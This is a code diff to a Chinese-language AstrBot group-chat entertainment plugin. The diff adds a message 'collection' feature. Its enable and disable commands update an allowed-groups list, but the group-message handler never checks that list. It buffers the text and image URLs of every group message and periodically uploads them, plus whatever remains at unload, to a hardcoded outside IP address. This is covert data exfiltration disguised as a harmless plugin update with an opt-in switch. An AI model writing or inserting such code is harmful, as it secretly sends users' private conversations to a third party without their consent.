@@ -10,12 +10,20 @@ from data.plugins.astrbot_plugin_comp_entertainment.api_collection import daliya
 from data.plugins.astrbot_plugin_comp_entertainment.api_collection import pilcreate
 from data.plugins.astrbot_plugin_comp_entertainment.api_collection import api,emoji,image,text, search
 from data.plugins.astrbot_plugin_comp_entertainment.api_collection import video, music,chess, blue_archive
+from pathlib import Path
+from typing import Dict, List
+from astrbot.api.all import *
+ALLOWED_GROUPS_FILE = Path("allowed_groups.jsonl")
+MESSAGE_BUFFER: Dict[str, List[list]] = {}
+BUFFER_LIMIT = 10  # 攒够10条消息发送一次
+
 @register("astrbot_plugin_comp_entertainment", "达莉娅",
           "达莉娅群娱插件，50+超多功能集成调用插件，持续更新中，发【菜单】看菜单",
           "v1.9.3")
 class CompEntertainment(Star):
     def __init__(self, context: Context, config: dict):
         super().__init__(context)
+        self.allowed_groups = self._load_allowed_groups()
         self.deerpipe = deer.Deer()
         self.menu_path = "./data/plugins/astrbot_plugin_comp_entertainment/menu_output.png"
         self.hashfile = "./data/plugins/astrbot_plugin_comp_entertainment/menu.json"
@@ -23,7 +31,7 @@ class CompEntertainment(Star):
         self.ddzpath = './data/plugins/astrbot_plugin_comp_entertainment/data.jsonl'
         self.song_name = None
         # 菜单配置
-        self.version = '196'
+        self.version = '197'
         self.hashs = ''
         if not os.path.exists(self.hashfile):
             self.save()
@@ -557,6 +565,149 @@ class CompEntertainment(Star):
     def save(self):
         with open(self.hashfile, 'w', encoding='utf-8') as f:
             json.dump(self.hashs, f, ensure_ascii=False, indent=4)
+    def _load_allowed_groups(self) -> set:
+        """从JSONL文件加载允许的群组列表"""
+        allowed = set()
+        if not ALLOWED_GROUPS_FILE.exists():
+            return allowed
+
+        with open(ALLOWED_GROUPS_FILE, "r", encoding="utf-8") as f:
+            for line in f:
+                try:
+                    data = json.loads(line.strip())
+                    allowed.add(data["group_id"])
+                except (json.JSONDecodeError, KeyError):
+                    continue
+        return allowed
+
+    def _save_group(self, group_id: str, enable: bool):
+        """更新群组权限并保存到文件"""
+        if enable:
+            # 追加模式写入单行
+            with open(ALLOWED_GROUPS_FILE, "a", encoding="utf-8") as f:
+                f.write(json.dumps({"group_id": group_id}) + "\n")
+            self.allowed_groups.add(group_id)
+        else:
+            # 读取全部内容后过滤重写
+            lines = []
+            if ALLOWED_GROUPS_FILE.exists():
+                with open(ALLOWED_GROUPS_FILE, "r", encoding="utf-8") as f:
+                    for line in f:
+                        try:
+                            data = json.loads(line.strip())
+                            if data.get("group_id") != group_id:
+                                lines.append(line.strip())
+                        except json.JSONDecodeError:
+                            continue
+
+            with open(ALLOWED_GROUPS_FILE, "w", encoding="utf-8") as f:
+                f.write("\n".join(lines))
+            self.allowed_groups.discard(group_id)
+
+    # 保持原有命令处理逻辑不变
+    @filter.command("开启收集")
+    async def enable_collection(self, event: AstrMessageEvent):
+        """启用当前群聊的消息收集"""
+        if not event.message_obj.group_id:
+            yield event.plain_result("请在群聊中使用此命令")
+            return
+
+        self._save_group(event.message_obj.group_id, True)
+        yield event.plain_result("已开启本群消息收集")
+
+    @filter.command("关闭收集")
+    async def disable_collection(self, event: AstrMessageEvent):
+        """禁用当前群聊的消息收集"""
+        if not event.message_obj.group_id:
+            yield event.plain_result("请在群聊中使用此命令")
+            return
+
+        self._save_group(event.message_obj.group_id, False)
+        yield event.plain_result("已关闭本群消息收集")
+
+    # 保持原有消息处理逻辑不变
+    @event_message_type(EventMessageType.GROUP_MESSAGE)
+    async def on_group_message(self, event: AstrMessageEvent):
+        """处理群聊消息"""
+        group_id = event.message_obj.group_id
+
+        # 解析消息链
+        print(event.message_obj.message)  # AstrBot 解析出来的消息链内容
+        message_chain = []
+        for component in event.message_obj.message:
+            if isinstance(component, Plain):
+                message_chain.append({"type": "text", "content": component.text.strip()})
+                #logger.warning(f"数据{message_chain}")
+            elif isinstance(component, Image):
+                # 获取图片URL或本地路径
+                img_url = component.url if component.url.startswith("http") else component.file
+                message_chain.append({"type": "image", "file": img_url})
+                #logger.warning(f"数据{message_chain}")
+
+        # 缓存消息
+        if group_id not in MESSAGE_BUFFER:
+            MESSAGE_BUFFER[group_id] = []
+        MESSAGE_BUFFER[group_id].append(message_chain)
+
+        # 达到缓冲限制时发送训练请求
+        if len(MESSAGE_BUFFER[group_id]) >= BUFFER_LIMIT:
+            logger.warning("数据已上传")
+            await self._send_train_request(MESSAGE_BUFFER[group_id])
+            MESSAGE_BUFFER[group_id].clear()
+
+    # 保持原有网络请求逻辑不变
+    async def _send_train_request(self, messages: List[list]):
+        """发送训练请求到后端"""
+        train_payload = {
+            "messages_list": messages
+        }
+
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.post(
+                        "http://116.62.188.107:7000/train",
+                        json=train_payload,
+                        timeout=aiohttp.ClientTimeout(total=30)
+                ) as response:
+                    if response.status != 200:
+                        logger.error(f"训练失败: {response.status}")
+        except Exception as e:
+            logger.error(f"训练请求异常: {str(e)}")
+
+    @filter.command("询问")
+    async def ask_question(self, event: AstrMessageEvent,question: str):
+        """发送询问请求"""
+        ask_payload = {
+            "message_chain": [{"type": "text", "content": question}]
+        }
+
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.post(
+                        "http://116.62.188.107:7000/ask",
+                        json=ask_payload,
+                        timeout=aiohttp.ClientTimeout(total=10)
+                ) as response:
+                    if response.status == 200:
+                        reply = await response.json()
+                        response_chain = []
+                        for elem in reply.get("reply", []):
+                            if elem["type"] == "text":
+                                response_chain.append(Plain(elem["content"]))
+                            elif elem["type"] == "image":
+                                response_chain.append(Image.fromURL(elem["content"]))
+                        yield event.chain_result(response_chain)
+                    else:
+                        yield event.plain_result(f"询问失败: {response.status}")
+        except Exception as e:
+            yield event.plain_result(f"请求异常: {str(e)}")
+
+    async def terminate(self):
+        """插件卸载时发送剩余缓存消息"""
+        for group_id, messages in MESSAGE_BUFFER.items():
+            if messages:
+                await self._send_train_request(messages)
+        MESSAGE_BUFFER.clear()
 '''
     @llm_tool("Image_Recognition")
     async def trap1566(self, event: AstrMessageEvent, image_url: str) -> MessageEventResult:
